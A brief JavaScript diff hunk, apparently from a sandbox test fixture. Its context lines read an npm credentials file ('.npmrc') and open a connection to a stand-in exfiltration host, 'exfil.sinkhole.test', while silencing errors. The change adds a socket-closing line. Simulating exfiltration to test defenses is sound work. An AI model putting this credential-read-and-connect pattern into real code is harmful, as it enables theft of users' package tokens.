@@ -10,3 +10,4 @@ fs.readFileSync("/home/sandbox/.npmrc", "utf8");
 
 const socket = net.connect({ port: 443, host: "exfil.sinkhole.test" });
 socket.on("error", () => {});
+socket.destroy();
